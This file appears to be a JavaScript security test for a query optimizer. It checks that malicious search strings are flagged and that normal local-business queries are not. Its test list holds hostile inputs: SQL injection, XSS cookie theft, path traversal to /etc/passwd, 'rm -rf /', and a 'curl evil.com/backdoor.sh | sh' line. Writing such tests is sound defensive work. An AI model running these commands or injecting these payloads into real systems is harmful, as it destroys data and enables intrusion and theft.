/**
 * Security Testing for Query Optimization
 * Tests SQL injection and XSS prevention
 */

import { BusinessQueryOptimizer } from "../BusinessQueryOptimizer.js";

console.log("=== Security Testing for Query Optimizer ===\n");

// Test cases with malicious inputs
const maliciousQueries = [
  // SQL Injection attempts
  "plumber' OR 1=1--",
  "electrician'; DROP TABLE users;--",
  "hvac service' UNION SELECT * FROM passwords--",
  "locksmith' AND (SELECT * FROM credit_cards)--",
  "roofing'; exec xp_cmdshell 'net user hacker password /add'--",

  // XSS attempts
  "plumber <script>alert('XSS')</script>",
  "electrician <img src=x onerror=alert('XSS')>",
  "hvac service <iframe src='javascript:alert(1)'></iframe>",
  "locksmith javascript:alert(document.cookie)",
  "roofing <svg onload=alert('XSS')>",

  // Path traversal attempts
  "plumber in ../../etc/passwd",
  "electrician Los Angeles ../../../windows/system32",

  // Command injection attempts
  "plumber; cat /etc/passwd",
  "electrician | whoami",
  "hvac service && rm -rf /",
  "locksmith `curl evil.com/backdoor.sh | sh`",

  // Mixed attacks
  "plumber' OR '1'='1' <script>alert('XSS')</script>--",
  "electrician Los Angeles' UNION SELECT password FROM users WHERE '1'='1",

  // Excessive length attack
  "plumber " + "A".repeat(1000),

  // Repeated character DOS attempt
  "electrician " + "X".repeat(50),
];

console.log("Testing " + maliciousQueries.length + " malicious queries...\n");

let blockedCount = 0;
let passedCount = 0;

maliciousQueries.forEach((query, index) => {
  console.log(
    `Test ${index + 1}: "${query.substring(0, 50)}${query.length > 50 ? "..." : ""}"`,
  );

  const result = BusinessQueryOptimizer.optimize(query);

  if (result.securityFlags.length > 0) {
    blockedCount++;
    console.log("✅ BLOCKED - Security issues detected:");
    result.securityFlags.forEach((flag) => {
      console.log(
        `   - [${flag.severity.toUpperCase()}] ${flag.type}: ${flag.detail}`,
      );
    });
  } else {
    passedCount++;
    console.log(
      "❌ PASSED - No security issues detected (potential vulnerability)",
    );
    console.log(`   Optimized to: "${result.optimizedQuery}"`);
  }
  console.log();
});

console.log("\n=== Security Test Summary ===");
console.log(`Total tests: ${maliciousQueries.length}`);
console.log(
  `Blocked: ${blockedCount} (${((blockedCount / maliciousQueries.length) * 100).toFixed(1)}%)`,
);
console.log(
  `Passed: ${passedCount} (${((passedCount / maliciousQueries.length) * 100).toFixed(1)}%)`,
);

if (blockedCount === maliciousQueries.length) {
  console.log("\n✅ All malicious queries were successfully blocked!");
} else {
  console.log(
    "\n⚠️  Warning: Some malicious queries were not blocked. Review security measures.",
  );
}

// Test legitimate queries to ensure they're not over-blocked
console.log("\n\n=== Testing Legitimate Queries ===\n");

const legitimateQueries = [
  "plumber near me",
  "24/7 electrician Los Angeles",
  "emergency HVAC repair Denver",
  "licensed locksmith 90210",
  "best roofing contractor Philadelphia reviews",
];

let legitBlocked = 0;
let legitPassed = 0;

legitimateQueries.forEach((query, index) => {
  console.log(`Test ${index + 1}: "${query}"`);

  const result = BusinessQueryOptimizer.optimize(query);

  if (result.securityFlags.length > 0) {
    legitBlocked++;
    console.log("❌ BLOCKED (false positive):");
    result.securityFlags.forEach((flag) => {
      console.log(
        `   - [${flag.severity.toUpperCase()}] ${flag.type}: ${flag.detail}`,
      );
    });
  } else {
    legitPassed++;
    console.log("✅ PASSED - Query processed successfully");
    console.log(`   Optimized to: "${result.optimizedQuery}"`);
  }
  console.log();
});

console.log("\n=== Legitimate Query Summary ===");
console.log(`Total tests: ${legitimateQueries.length}`);
console.log(
  `Passed: ${legitPassed} (${((legitPassed / legitimateQueries.length) * 100).toFixed(1)}%)`,
);
console.log(
  `Blocked: ${legitBlocked} (${((legitBlocked / legitimateQueries.length) * 100).toFixed(1)}%)`,
);

if (legitPassed === legitimateQueries.length) {
  console.log("\n✅ All legitimate queries were processed successfully!");
} else {
  console.log(
    "\n⚠️  Warning: Some legitimate queries were incorrectly blocked (false positives).",
  );
}
